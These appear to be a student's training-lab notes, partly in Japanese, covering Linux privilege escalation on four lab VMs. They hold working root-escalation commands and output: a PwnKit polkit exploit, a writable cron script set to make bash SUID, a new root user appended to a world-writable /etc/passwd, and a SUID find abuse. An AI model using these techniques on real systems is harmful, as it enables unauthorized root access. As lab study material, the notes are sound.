## VM2
[https://github.com/ly4k/PwnKit/blob/main/PwnKit](https://github.com/ly4k/PwnKit/blob/main/PwnKit)
古いバージョンのKarnelの認証(polkit)の脆弱性を利用する
```bash
#Victim
uname -r
4.4.0-116-generic

#Kali
scp PwnKit joe@192.168.180.216:

#Victim
chmod 777 PwnKit 

./PwnKit 

id
uid=0(root) gid=0(root) groups=0(root),1001(joe)

```
---
## VM3
```bash
ssh student@192.168.180.52 -p2222

ls -lah /etc/cron*

/etc/cron.hourly:
total 16K
drwxr-xr-x 1 root root 4.0K Dec  7  2021 .
drwxr-xr-x 1 root root 4.0K Jul 12 16:37 ..
-rw-r--r-- 1 root root  102 Feb 22  2021 .placeholder
-rw-r--r-- 1 root root  139 Dec  7  2021 archiver

cat /etc/cron.hourly/archiver                        
#!/bin/sh
# I wanted this to run more often so moved to it to my personal crontab so I could run it every minute
/var/archives/archive.sh

cat /var/archives/archive.sh                           
#!/bin/bash
TIMESTAMP=$(date +"%T")
echo "$TIMESTAMP running the archiver"
#cp -rf /home/kali/ /var/backups/kali/
cp -rf /home/student/ /var/backups/student/

echo "chmod u+s /bin/bash" >> /var/archives/archive.sh

ls -la /bin/bash                          
-rwsr-xr-x 1 root root 1254856 Oct 15  2020 /bin/bash

/bin/bash -p                                                                                             

bash-5.1# id
uid=1000(student) gid=1000(student) euid=0(root) groups=1000(student)
bash-5.1# whoami
root
bash-5.1# cd /root/
bash-5.1# ls
flag.txt
bash-5.1# cat flag.txt
```
---
## VM4
```bash
└─$ ls -la /etc/passwd
-rw-rw-rw- 1 root root 1370 Jul 13 13:44 /etc/passwd
┌──(student㉿6cfa0a805f4d)-[~]
└─$ openssl passwd w00t                                                     
DPwf7nemkGSlI
┌──(student㉿6cfa0a805f4d)-[~]
└─$ echo "root2:DPwf7nemkGSlI:0:0:root:/root:/bin/bash" >> /etc/passwd      
┌──(student㉿6cfa0a805f4d)-[~]
└─$ su root2
Password: 
┌──(root💀6cfa0a805f4d)-[/home/student]
└─# cat /root/flag.txt 
OS{}
```
---
## VM5
```bash
student@3afd11bd5457:~$ find / -perm -u=s -type f 2>/dev/null

/usr/bin/find

student@3afd11bd5457:~$ ./find . -exec /bin/sh -p \; -quit
-bash: ./find: No such file or directory
student@3afd11bd5457:~$ ls -la /usr/bin/find 
-rwsr-xr-x 1 root root 238080 Nov  5  2017 /usr/bin/find
student@3afd11bd5457:~$ find /home/student -exec "/bin/bash" -p \;
bash-4.4# id
uid=1000(student) gid=1000(student) euid=0(root) groups=1000(student)
bash-4.4# cd /root
bash-4.4# ls
flag.txt
bash-4.4# cat flag.txt
Great job! You found me.
Here is your flag:

```